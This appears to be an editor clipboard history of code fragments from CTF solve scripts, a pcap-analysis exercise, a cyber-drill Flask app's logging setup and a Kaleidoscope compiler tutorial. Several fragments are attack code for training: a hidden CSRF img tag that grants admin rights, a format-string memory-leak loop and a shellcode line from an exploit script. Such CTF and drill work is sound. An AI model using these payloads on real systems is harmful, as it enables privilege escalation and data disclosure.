544c64f5bbc22c8e41621983de073e48|file:///home/neo/247ctf/misc/sol_try.py|4|1|V|python
	# URL = b'https://0b1eb6c06498c22f.247ctf.com/calculator'
2b7b6c81f747039c62bf65088fed722f|file:///home/neo/247ctf/misc/try.py|15|1|V|python
	        print('Val:',val)
a8b94196cd81dea05e9023a7f8e2be99|file:///home/neo/247ctf/misc/try.py|16|9|V|python
	        print('Ret:',ret)
3131e5b066d5d5391302c5ab52def4aa|file:///home/neo/cyberranges/wireshark-scenario/Pcaps/clear.py|1|1|V|python
	from scapy.all import *
	
	pcap = rdpcap("urg3nt_c4ll.pcap")
	packets = PacketList([p for p in pcap if Raw in p])
	
	for p in packets:
	    print(p['TCP'].payload)
c7f7ceeebeed80ab6074621973a8d88a|file:///home/neo/247ctf/networking/sol_custom.py|3|16|v|python
	urg3nt_c4ll
b74aa5ae4afeb64d4eef7c1ad0ab8ad7|file:///home/neo/247ctf/networking/sol_custom.py|5|20|V|python
	sessions = pcap.sessions()
	for session in sessions:
	    for packet in session:
	        print(packet)
255e24a7c141324843fff5268475bfa7|file:///home/neo/247ctf/networking/sol_custom.py|7|24|v|python
	.payload)
161bca2e917335e125291a00fd76a80f|file:///home/neo/247ctf/networking/sol_custom.py|8|1|V|python
	sessions
3c41fc78bef789ca3e1cf051c6ba5e90|file:///home/neo/247ctf/networking/sol_custom.py|6|25|V|python
	    for packet in session:
	        print(packet)
06a488e0900787f6fae164e6bf6f3ba9|file:///home/neo/247ctf/networking/sol_custom.py|5|1|V|python
	for session in sessions[0]:
105ee06987d36d13a3970ede6ecd052a|file:///home/neo/247ctf/networking/sol_custom.py|6|34|v|python
	pcap
24c4995ab08cef87163e754c4152dc7b|file:///home/neo/247ctf/networking/sol_custom.py|5|1|V|python
	print(sessions)
05668427b872fb3fb1d30904c8f4149f|file:///home/neo/247ctf/networking/sol_custom.py|5|1|V|python
	sesh = sessions
30e5b10076e383491520ef231b05e473|file:///home/neo/247ctf/networking/sol_custom.py|6|1|V|python
	server = '172.17.0.1'
6896150b5bae7db6063de16c7e846ac3|file:///home/neo/247ctf/networking/sol_custom.py|15|5|V|python
	    print(port)
8e18e3c2f7f48bb2e29ade9a6f6021fd|file:///home/neo/247ctf/networking/sol_custom.py|19|1|V|python
	print(sessions.keys())
cec7d8be74a417ee3ac8f9532c25cf2e|file:///home/neo/247ctf/networking/sol_custom.py|19|1|V|python
	for port in sessions.keys():
66bffad33a7ed8b0258e34bf1392cd01|file:///home/neo/247ctf/networking/sol_custom.py|21|1|V|python
	#     print(port)
aa47f518f9327228ca112cefe23acd71|file:///home/neo/247ctf/networking/sol_custom.py|20|12|v|python
	= session[0][IP].src
3d53bb89c266596c166b5f4511f19732|file:///home/neo/247ctf/networking/sol_custom.py|22|5|V|python
	    print(source, '--->', dest)
a7d716439a52cdf69ad1c08293d00d73|file:///home/neo/247ctf/networking/sol_custom.py|20|23|V|python
	    source = session[0][IP].src
	    dest= session[0][IP].dst
ca4d8b4a4c4ef22cede6dc19dcc34847|file:///home/neo/247ctf/networking/sol_custom.py|24|1|V|python
	            print("Server:")
2c32f316b64fe48b48b0401158dca1c3|file:///home/neo/247ctf/networking/sol_custom.py|32|9|V|python
	        print(seq)
3ac1c768819fef5817c4982812f47c40|file:///home/neo/247ctf/networking/sol_custom.py|35|9|V|python
	        magic = payload[2]
	        print(magic)
f5ada596cb7c998fec5e13b7a08e8da6|file:///home/neo/247ctf/networking/sol_custom.py|34|9|V|python
	        print(magic)
15329418e50da64851adb27b743f9956|file:///home/neo/247ctf/networking/sol_custom.py|23|1|V|python
	        if sender == server:
	            print("Server:")
	        else:
	            print("Client:")
eddec3e8bdd60340ef07417bbf742bc0|file:///home/neo/247ctf/networking/sol_custom.py|34|9|V|python
	        print('Prefix:', prefix)
149a3092d9c5ecf53e16b1a0f03b0c2a|file:///home/neo/247ctf/networking/sol_custom.py|30|13|V|python
	        if '2' in payload and sender == client:
	            print(payload)
ff51e3a7d5c28928cd65c8db19edff7d|file:///home/neo/247ctf/networking/sol_custom.py|40|9|V|python
	        print(bytes.fromhex())
e35c31ccfbbc160b1590a32e81365c18|file:///home/neo/247ctf/networking/sol_custom.py|36|1|V|python
	        if sender == server:
	            print("Server:", payload)
	        else:
	            print("Client:", payload)
a3a995e30e8fd1271edc9f20d57ac84b|file:///home/neo/247ctf/reversing/sol_keygen.py|2|1|v|python
	   ...:     
646aa1c09c9ac21b619dd62073ae02b2|file:///home/neo/247ctf/reversing/sol_keygen.py|3|1|v|python
	   ...:         
119d539b8ac4ac2e3849035a6c89a0b9|file:///home/neo/247ctf/reversing/sol_lock.py|1|1|V|python
	from z3 import *
	
	s = Solver()
	
13fb3b9bd4a298b504b4be20fd7193dc|file:///home/neo/247ctf/reversing/sol_lock.py|5|1|V|python
	flag = [BitVec(f"c{i}", 32) for i in range(40)]
df79b7dd695e5a1fe2137a89ad6f2b20|file:///home/neo/247ctf/reversing/sol_keygen.py|5|1|V|python
	total = BitVec("t", 32)
adb3f521086e9348cec1a882c516ac95|file:///home/neo/247ctf/reversing/sol_keygen.py|13|1|V|python
	inp = 'A' * 16 + 'O' * 16
d25804cc8ab5e9141bbcf50e206decb2|file:///home/neo/247ctf/reversing/sol_keygen.py|9|15|v|python
	 + 'M' * 16
991e47818b74bf28ae180d2b0e0e6f18|file:///home/neo/247ctf/reversing/sol_keygen.py|2|1|V|python
	def inc_char(c):
	    if c < 'N':
	        return ord(c) + 0xb5
	    else:
	        return ord(c) + 0xb1
fdc205796816dc52960ee7cf3474cc3d|file:///home/neo/kaleidoscope/Lexer.cpp|36|9|V|cpp
	        return tok_identifier;
e1eba0735eeaa06bfe429bbff33873e3|file:///home/neo/247ctf/pwnable/sol_confwrite.py|3|13|v|python
	0c3a6f0990b054c8.247ctf.com
e1eba0735eeaa06bfe429bbff33873e3|file:///home/neo/247ctf/pwnable/sol_confwrite.py|3|13|v|python
	0c3a6f0990b054c8.247ctf.com
c2b268503aa3832245d810d108ce34f1|file:///home/neo/247ctf/pwnable/sol_confwrite.py|10|5|V|python
	    addr = int(line, 16)
e2f8555d97a9157a79f9dd91fbc05038|file:///home/neo/247ctf/pwnable/sol_environ.py|10|1|V|python
	    if addr[:4] == b'0xff':
	        r.sendline('%'+str(i)+'$s')
	        r.recvuntil('back ')
	        string = r.recvuntil('!')[:-1]
	        print(string)
6e8233178afc1c4be75605c7ed698e7f|file:///home/neo/247ctf/pwnable/sol_confwrite.py|6|1|V|python
	    try: 
a6018ec34f5c8300892004f008462e12|file:///home/neo/247ctf/pwnable/sol_confwrite.py|12|23|^v|python
	+str(i)+'
627c5eb53a5a7498dfa8e304fe1aad24|file:///home/neo/247ctf/pwnable/sol_confwrite.py|3|1|V|python
	r = remote('0c3a6f0990b054c8.247ctf.com', 50390)
9ba389ee3e0a75b5f40ebbbafd6b3f67|file:///home/neo/pwnabletw/start/exploit.py|50|1|V|python
	shellcode = asm("xor ebx, ebx; mov ecx, 0xffffcf50; mov dl, 0x50; mov al, 3; int 0x80")
0e7a8058785469a9c33fa920fec26f00|file:///home/neo/pwnabletw/start/exploit.py|49|1|V|python
	buff = 0xffffcf74
1e4ff25eaaa97e091e90a286c41d8d5a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/app/templates/index.html|24|1|V|htmldjango
	                <img src="http://192.168.125.10/makeAdmin?user=hacker1" width="0" height="0" border="0"/>                
5f7087762dc2d91b17b275c3e0cf163f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|27|1|V|python
	from logging.config import dictConfig
	
	dictConfig({
	    'version': 1,
	    'formatters': {'default': {
	        'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
	    }},
	    'handlers': {'wsgi': {
	        'class': 'logging.StreamHandler',
	        'stream': 'ext://flask.logging.wsgi_errors_stream',
	        'formatter': 'default'
	    }},
	    'root': {
	        'level': 'INFO',
	        'handlers': ['wsgi']
	    }
	})
c00236f9f0a48cfd3398e1a57afe2abb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|26|1|V|python
	mail_handler.setFormatter(formatter)
2409c1d400abfd12d280aa4257154f89|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|24|1|V|python
	    '[%(asctime)s] %(remote_addr)s requested %(url)s\n'
	    '%(levelname)s in %(module)s: %(message)s'
4b944fc2914a22b33c7a72712881a637|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|33|18|v|python
	 '[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
6fe99d6b7be89d08782361b626c83314|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|13|1|V|python
	class RequestFormatter(logging.Formatter):
	    def format(self, record):
	        if has_request_context():
	            record.url = request.url
	            record.remote_addr = request.remote_addr
	        else:
	            record.url = None
	            record.remote_addr = None
	
	        return super().format(record)
	
	formatter = RequestFormatter(
	    '[%(asctime)s] %(remote_addr)s requested %(url)s\n'
	    '%(levelname)s in %(module)s: %(message)s'
	)
fb5d812e75cc12c3b67b4471b3576078|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|10|1|V|python
	from flask import logging
84018920588878e3cd97bdf89489d469|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|55|11|v|python
	 = default_handler
e039bc7386faeca7e3a433eb7653bdbb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|55|1|V|python
	app.logger.h
d334f10569ed4bfcec4734cfd97c3ce6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|347|5|V|python
	    app.logger.addHandler(defaul)
b9b77b9aaf5f69d5821e8873384eebe6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|31|1|V|python
	app.logger.addHandler(default_handler)
1edff428c93c5905ce7bf63bd1219035|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|32|4|V|python
	# dictConfig({
	#     'version': 1,
	#     'formatters': {'default': 
	#         { 'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s', }
	#         },
	#     'handlers': {'wsgi': {
	#         'class': 'logging.StreamHandler',
	#         'stream': 'ext://flask.logging.wsgi_errors_stream',
	#         'formatter': 'default'
	#     }},
	#     'root': {
	#         'level': 'INFO',
	#         'handlers': ['wsgi']
	#     }
	# })
	
9cfe840971b82a004fc1024782744598|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|29|1|V|python
	default_handler.setLevel(logging.DEBUG)
a63e9b88b9fe75a57c845204053d633a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|30|1|V|python
	logging.basicConfig(filename='example.log',level=logging.DEBUG)
2039cab48b81597b00a15e8b862bdd25|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|31|8|V|python
	        : { 'format': '[%(asctime)s] %(levelname)s in %(module)s: %(message)s', }
1eb5603bbf082f3b7ecc93044f39e863|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|31|9|V|python
	        },
c21f969b5f03d33d43e04f8f136e7682|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|30|20|v|python
	default
d2c7195a2a6e5cdec0a3b0dfc0c8cfe0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|32|27|v|python
	StreamHandler
9dab46c2842c44ea5ab264b9650973c4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|33|9|V|python
	        'stream': 'ext://flask.logging.wsgi_errors_stream',
386de6a2ba919e939688629a0a14fee7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|23|1|V|python
	formatter = RequestFormatter(
	    '[%(asctime)s] %(remote_addr)s requested %(url)s\n'
	    '%(levelname)s in %(module)s: %(message)s'
	)
58b9da14d368a9512356b558f56a0995|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|31|1|V|python
	        ''
9bed9c530ce4de8d67c3039c49c08b7d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|31|1|v|python
	formatter =
94e3587fe4edd09e75ea1241b3f9a431|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|31|2|V|python
	 'RequestFormatter(
	    '[%(asctime)s] %(remote_addr)s requested %(url)s\n'
	    '%(levelname)s in %(module)s: %(message)s'
	)'
f2ffc59487832cbad265a8fef2133592|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|30|21|v|python
	formatter
8384796fb4274ac9bd0a1b8cf553bee9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|28|1|V|python
	dictConfig({
	    'version': 1,
	    'formatters': {'custom':{'()' : 'formatter'} },
	    'handlers': {'wsgi': {
	        'class': 'logging.FileHandler',
	        'filename' : 'example.log',
	        'mode' : 'a',
	        'formatter': 'formatter'
	    }},
	    'root': {
	        'level': 'INFO',
	        'handlers': ['wsgi']
	    }
	})
	
5dfa188a554c666bbf933195107cbd0d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|43|1|V|python
	app.logger.a
ddddb6b12c65b365a595065fb2482f91|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|28|12|V|python
	logging_handler = logging.FileHandler("example.log",mode="w")
	logging_handler.setLevel(logging.DEBUG)
	logging_handler.setFormatter(formatter)
	log = logging.getLogger('werkzeug')
	log.setLevel(logging.DEBUG)
	log.addHandler(logging_handler)
a45c752dcf2f7839dcdb783e192cf08e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|7|1|V|python
	from logging.config import dictConfig
478daa1d84651297eb2f39b28e37df1e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|36|1|V|python
	app.logger.addHandler(logging_handler)
074e7df1f0e873a8ab28d28b16b260af|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|14|1|V|python
	        #     record.url = request.url
	        #     record.remote_addr = request.remote_addr
ec5f807214b75681f7e179ab03d99402|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|11|1|V|python
	class RequestFormatter(logging.Formatter):
	    def format(self, record):
	        if has_request_context():
	            record.url = request.url
	            record.remote_addr = request.remote_addr
	        else:
	            record.url = None
	            record.remote_addr = None
	
	        return super().format(record)
	
	formatter = RequestFormatter(
	    '[%(asctime)s] %(remote_addr)s requested %(url)s\n'
	    '%(levelname)s in %(module)s: %(message)s'
	)
	
27960e03a319582644bce153453aae8b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|335|5|V|python
	    app.run(debug=False,host='0.0.0.0', port=11337)
58d14ec413dc978c63af77907b59f24a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|286|5|V|python
	    print(request.remote_addr)
6e0ef5c5e32e70bd8eea07724ff513c8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|333|5|V|python
	    logging_handler = logging.FileHandler("example.log",mode="w")
	    logging_handler.setLevel(logging.DEBUG)
	    logging_handler.setFormatter(formatter)
	    log = logging.getLogger('werkzeug')
	    log.setLevel(logging.DEBUG)
	    log.addHandler(logging_handler)
	    app.logger.addHandler(logging_handler)
e19a179421da23d7d1d2f33a46366e6d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|334|1|V|python
	@app.before_request
	def log_request_info():
	    app.logger.debug('Headers: %s', request.headers)
	    app.logger.debug('Body: %s', request.get_data())
	
ed294d47da7ddb852b73b231c6674405|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|341|5|V|python
	    app.logger.addHandler(logging_handler)
b36eb6a54154f7301f004e1e61c87ce8|file:///home/neo/kaleidoscope/toy.cpp|214|1|v|cpp
	switch
a9790696091519715bed99823e9bd3c1|file:///home/neo/kaleidoscope/toy.cpp|242|13|V|cpp
	int main() {
	  // Install standard binary operators.
	  // 1 is lowest precedence.
	  BinopPrecedence['<'] = 10;
	  BinopPrecedence['+'] = 20;
	  BinopPrecedence['-'] = 20;
	  BinopPrecedence['*'] = 40;  // highest.
	}
	
bb2035a1eb873ecdc39646bdcb2c8feb|file:///home/neo/kaleidoscope/toy.cpp|266|5|V|cpp
	    // now we know it's a binop
	    int BinOp = CurTok;
	    getNextToken(); // eat binop
	
	    // parse the primary expression after the primary operator
	    auto RHS = ParsePrimary();
	    if (!RHS)
	        return nullptr;
	
	    // If BinOp binds less tightly with RHS than the operator after RHS,
	    // let the pending operator take RHS as its LHS
	    int NextPrec = GetTokPrecedence();
	    if (TokPrec < NextPrec) {
	
	    }
	
	    // Merge LHS/RHS
	    LHS = std::make_unique<BinaryExprAST>(BinOp, std::move(LHS), std::move(RHS));
f393f3f5e496869a15bc72cbfd56f541|file:///home/neo/kaleidoscope/toy.cpp|351|22|v|cpp
	identifier
1fdb5e20e4a2a6af3654e71ac3ff355c|file:///home/neo/kaleidoscope/toy.cpp|372|3|V|cpp
	  //
8f84d03a7968609cdc07ee3e2a1ed3bc|file:///home/neo/kaleidoscope/toy.cpp|1|1|V|cpp
	#include <map>
	#include <memory>
	#include <string>
	#include <vector>
	
	enum Token {
	    tok_eof = -1,
	    
	    // commands
	    tok_def = -2,
	    tok_extern = -3,
	
	    // primary
	    tok_identifier = -4,
	    tok_number = -5,
	};
	
	static std::string IdentifierStr; // filled in if tok_identifier
	static double NumVal; //filled in if tok_number
	
	// Return the next token from standard input
	static int gettok(){
	    static int LastChar = ' ';
	
	    // skip any whitespace
	    while (isspace(LastChar))
	        LastChar = getchar();
	
	    if (isalpha(LastChar)){ // identifier: [a-zA-Z][a-zA-Z0-9]*
	        IdentifierStr = LastChar;
	        while (isalnum((LastChar = getchar()))){
	            IdentifierStr += LastChar;
	        }
	
	        if (IdentifierStr == "def")
	            return tok_def;
	        if (IdentifierStr == "extern")
	            return tok_extern;
	        return tok_identifier;
	    }
	
	    if (isdigit(LastChar) || LastChar == '.') { // Number: [0-9.]+
	        std::string NumStr;
	        do{
	            NumStr += LastChar;
	            LastChar = getchar();
	        } while (isdigit(LastChar) || LastChar == '.');
	
	        NumVal = strtod(NumStr.c_str(), 0);
	        return tok_number;
	    }
	
	    if (LastChar == '#') { // comment
	        do
	            LastChar = getchar();
	        while (LastChar != EOF && LastChar != '\n' && LastChar != '\r');
	
	        if (LastChar != EOF)
	            return gettok();
	    }
	
	    if (LastChar == EOF) // check end of file
	        return tok_eof;
	    
	    int ThisChar = LastChar;
	    LastChar = getchar();
	    return ThisChar;
	}
	
	// Base class for all expression nodes
	class ExprAST {
	public:
	    virtual ~ExprAST() {}
	};
	
	// Expression class for numeric literals
	class NumberExprAST : public ExprAST {
	    double Val;
	
	public:
	    NumberExprAST(double Val) : Val(Val) {}
	};
	
	// Expression class for referencing variables
	class VariableExprAST : public ExprAST {
	    std::string Name;
	
	public:
	    VariableExprAST(const std::string &Name) : Name(Name) {}
	};
	
	// Expression class for a binary operator
	class BinaryExprAST : public ExprAST {
	    char Op;
	    std::unique_ptr<ExprAST> LHS, RHS;
	
	public:
	    BinaryExprAST(char op, std::unique_ptr<ExprAST> LHS,
	            std::unique_ptr<ExprAST> RHS)
	        : Op(op), LHS(std::move(LHS)), RHS(std::move(RHS)) {}
	};
	
	class CallExprAST : public ExprAST {
	    std::string Callee;
	    std::vector<std::unique_ptr<ExprAST>> Args;
	
	public:
	    CallExprAST(const std::string &Callee,
	            std::vector<std::unique_ptr<ExprAST>> Args)
	        : Callee(Callee), Args(std::move(Args)) {}
	}; 
	
	// This class represents the "prototype" for a function,
	// which captures its name and its argument names (thus implicitly the
	// number of arguments the function takes)
	class PrototypeAST{
	    std::string Name;
	    std::vector<std::string> Args;
	
	public:
	    PrototypeAST(const std::string &name, std::vector<std::string> Args)
	        : Name(name), Args(std::move(Args)) {}
	
	    const std::string &getName() const { return Name; }
	};
	
	// This class represents a function definition itself.
	class FunctionAST {
	    std::unique_ptr<PrototypeAST> Proto;
	    std::unique_ptr<ExprAST> Body;
	
	public:
	    FunctionAST(std::unique_ptr<PrototypeAST> Proto,
	            std::unique_ptr<ExprAST> Body)
	        : Proto(std::move(Proto)), Body(std::move(Body)) {}
	};
	
	// Provide a simple token buffer. CurTok is the current token the parser
	// is looking at. getNextToken reads another token from the lexer and updates
	// CurTok with its results.
	static int CurTok;
	static int getNextToken() {
	    return CurTok = gettok();
	}
	
	// These are little helper functions for error handling.
	std::unique_ptr<ExprAST> LogError(const char *Str) {
	    fprintf(stderr, "LogError %s\n", Str);
	    return nullptr;
	};
	std::unique_ptr<PrototypeAST> LogErrorP(const char *Str){
	    LogError(Str);
	    return nullptr;
	}
	
	// numberexpr ::= number
	static std::unique_ptr<ExprAST> ParseNumberExpr() {
	    auto Result = std::make_unique<NumberExprAST>(NumVal);
	    getNextToken(); //consume the number
	    return std::move(Result);
	}
	
	// parenexpr ::= '(' expresssion ')'
	static std::unique_ptr<ExprAST> ParseParenExpr() {
	    getNextToken(); //eat '('
	    auto V = ParseExpression();
	    if (!V)
	        return nullptr;
	
	    if (CurTok != ')')
	        return LogError("expected ')'");
	    getNextToken(); //eat ')'
	    return V;
	};
	
	// identifierexpr
	//  ::= identifier
	//  ::= identifier '(' expression* ')'
	static std::unique_ptr<ExprAST> ParseIdentifierExpr() {
	    std::string IdName = IdentifierStr;
	
	    getNextToken(); //eat identifier
	
	    if (CurTok != '(') // Simpe variable ref.
	        return std::make_unique<VariableExprAST>(idName);
	
	    // call
	    getNextToken(); //eat (
	    std::vector<std::unique_ptr<ExprAST>> Args;
	    if (CurTok != ')'){
	        while (1){
	            if (auto Arg = ParseExpression())
	                Args.push_back(std::move(Arg));
	            else
	                return nullptr;
	
	            if (CurTok == ')')
	                break;
	            
	            if (CurTok != ',')
	                return LogError("Expected ')' or ',' in argument list");
	            getNextToken();
	        }
	    }
	
	    // Eat the ')'.
	    getNextToken();
	    return std::make_unique<CallExprAST>(IdName, std::move(Args));
	} 
	
	// primary
	//  ::= identifierexpr
	//  ::= numberexpr
	//  ::= parenexpr
	static std::unique_ptr<ExprAST> ParsePrimary(){
	    switch (CurTok) {
	        default:
	            return LogError("unknown token when expecting an expression");
	        case tok_identifier:
	            return ParseIdentifierExpr();
	        case tok_number:
	            return ParseNumberExpr();
	        case '(':
	            return ParseParenExpr();
	    }
	}
	
	// Precedence of binary operators
	static std::map<char, int> BinopPrecedence;
	
	// Get the precedece of the pending binary operation token
	static int GetTokPrecedence(){
	    if (!isascii(CurTok))
	        return -1;
	
	    // make sure it is a declared binop
	    int TokPrec = BinopPrecedence[CurTok];
	    if (TokPrec <= 0) return -1;
	    return TokPrec;
	}
	
	// expression 
	//  ::= primary binoprhs
	static std::unique_ptr<ExprAST> ParseExpression(){
	    auto LHS = ParsePrimary();
	    if (!LHS){
	        return nullptr;
	    }
	
	    return ParseBinOpRHS(0, std::move(LHS));
	}
	
	// binophrs
	//  ::= ('+' primary)*
	static std::unique_ptr<ExprAST> ParseBinOpRHS(int ExprPrec, std::unique_ptr<ExprAST> LHS){
	    // if this is a binop, find its precedence
	    while (1) {
	        int TokPrec = GetTokPrecedence();
	
	        //if this is a binop that binds at least as tightly as the current binop,
	        // consume it, otherwise we are done
	        if (TokPrec < ExprPrec){
	            return LHS;
	        }
	
	        // now we know it's a binop
	        int BinOp = CurTok;
	        getNextToken(); // eat binop
	
	        // parse the primary expression after the primary operator
	        auto RHS = ParsePrimary();
	        if (!RHS)
	            return nullptr;
	
	        // If BinOp binds less tightly with RHS than the operator after RHS,
	        // let the pending operator take RHS as its LHS
	        int NextPrec = GetTokPrecedence();
	        if (TokPrec < NextPrec) {
	            RHS = ParseBinOpRHS(TokPrec + 1, std::move(RHS));
	            if (!RHS)
	                return nullptr;
	        }
	
	        // Merge LHS/RHS
	        LHS = std::make_unique<BinaryExprAST>(BinOp, std::move(LHS), std::move(RHS));
	    } // loop around to the top of the while loop
	}
	
	// prototype
	//  ::= id '(' id* ')'
	static std::unique_ptr<PrototypeAST> ParsePrototype() {
	    if (CurTok != tok_identifier)
	        return LogErrorP("Expected function name in prototype");
	    
	    std::string FnName = IdentifierStr;
	    getNextToken();
	
	    if (CurTok != '(')
	        return LogErrorP("Expected '(' in prototype");
	    
	    // read the list of argument names
	    std::vector<std::string> ArgNames;
	    while (getNextToken() == tok_identifier)
	        ArgNames.push_back(IdentifierStr);
	    if (CurTok != ')')
	        return LogErrorP("Expected ')' in prototype");
	    
	    // success
	    getNextToken(); //eat ')'
	
	    return std::make_unique<PrototypeAST>(FnName, std::move(ArgNames));
	}
	
	// definition ::= 'def' prototype expression
	static std::unique_ptr<FunctionAST> ParseDefinition(){
	    getNextToken(); // eat def
	    auto Proto = ParsePrototype();
	    if (!Proto) return nullptr;
	
	    if (auto E = ParseExpression())
	        return std::make_unique<FunctionAST>(std::move(Proto), std::move(E));
	    return nullptr;
	}
	
	// external ::= 'extern' prototype
	static std::unique_ptr<PrototypeAST> ParseExtern(){
	    getNextToken(); // eat extern
	    return ParsePrototype();
	}
	
	// toplevelexpr ::= expression
	static std::unique_ptr<FunctionAST> ParseTopLevelExpr() {
	    if (auto E = ParseExpression()) {
	        //make an anonymous proto
	        auto Proto = std::make_unique<PrototypeAST>("", std::vector<std::string>());
	        return std::make_unique<FunctionAST>(std::move(Proto), std::move(E));
	    }
	    return nullptr;
	}
	
	static void HandleDefinition() {
	  if (ParseDefinition()) {
	    fprintf(stderr, "Parsed a function definition.\n");
	  } else {
	    // Skip token for error recovery.
	    getNextToken();
	  }
	}
	
	static void HandleExtern() {
	  if (ParseExtern()) {
	    fprintf(stderr, "Parsed an extern\n");
	  } else {
	    // Skip token for error recovery.
	    getNextToken();
	  }
	}
	
	static void HandleTopLevelExpression() {
	  // Evaluate a top-level expression into an anonymous function.
	  if (ParseTopLevelExpr()) {
	    fprintf(stderr, "Parsed a top-level expr\n");
	  } else {
	    // Skip token for error recovery.
	    getNextToken();
	  }
	}
	
	// top ::= definition | external | expression | ';'
	static void MainLoop(){
	    while (1) {
	        fprintf(stderr, "ready> ");
	        switch (CurTok) {
	            case tok_eof:
	                return;
	            case ';': // ignore top-level semicolons
	                getNextToken();
	                break;
	            case tok_def:
	                HandleDefinition();
	                break;
	            case tok_extern:
	                HandleExtern();
	                break;
	            default:
	                HandleTopLevelExpression();
	                break;
	        }
	    }
	}
	
	int main() {
	  // Install standard binary operators.
	  // 1 is lowest precedence.
	  BinopPrecedence['<'] = 10;
	  BinopPrecedence['+'] = 20;
	  BinopPrecedence['-'] = 20;
	  BinopPrecedence['*'] = 40;  // highest.
	  
	  // Prime the first token.
	  fprintf(stderr, "ready> ");
	  getNextToken();
	
	  // Run the main "interpreter loop" now.
	  MainLoop();
	
	  return 0;
	}
	
f0c6b8d8098066dc458c83dc00ac412b|file:///home/neo/kaleidoscope/toy.cpp|1|1|V|cpp
	#include "llvm/ADT/STLExtras.h"
fba86e7e7c474dac97ca55015f981c41|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|36|8|v|python
	‚Äô%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s‚Äô)
1fa09469d1976003b045cbd420c0cd36|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|31|1|V|python
	logger = logging.getLogger('my_logger')
	logger.setLevel(logging.INFO)
	logger.addHandler(logging_handler)
dc30ec20708ef7b0f641ef78b7880a15|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|32|22|v|python
	DEBUG
551b723eafd6a31d444fcb2f5920fbd3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|32|22|v|python
	INFO
169da270c10ff8283c2cbd3d6e6eb373|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|30|1|V|python
	
	log = logging.getLogger('werkzeug')
	log.setLevel(logging.DEBUG)
	log.addHandler(logging_handler)
23572c136fabeeae77b448196adba99d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|1|1|V|python
	
	
	You can add any additional data into log using logging.Formatter. Just an example:
	
	log.py
	
c60cadf146261dab15dce61a7a1ea785|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|93|5|V|python
	    log_request_info()
18d47d754f94142549f9906ed35895bb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|7|1|V|python
	        # you can set here everything what you need
	        # I just added url and id from GET parameter
096fd0db597e6d2d9e64de051e871582|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|11|9|V|python
	# format of our log record.
	# print url and id of record which was set in format()
de216248dd885619585cf3cf60555d2d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|28|1|V|python
	# logging_handler = logging.FileHandler("example.log",mode="w")
	# logging_handler.setLevel(logging.DEBUG)
62a8110175734e07b26ff50cf6d624cd|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|12|1|V|python
	file_handler = 
a723ace2109a89ce04d7799f8891dff1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|12|1|v|python
	logging_handler
9c8901a894f870f0db1836fe68ff69db|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|13|1|V|python
	file_handler.setLevel(logging.DEBUG)
8f1b1f1a0c44fba5a5c2c284da55484c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/log.py|11|1|V|python
	__stream_handler = logging.StreamHandler()
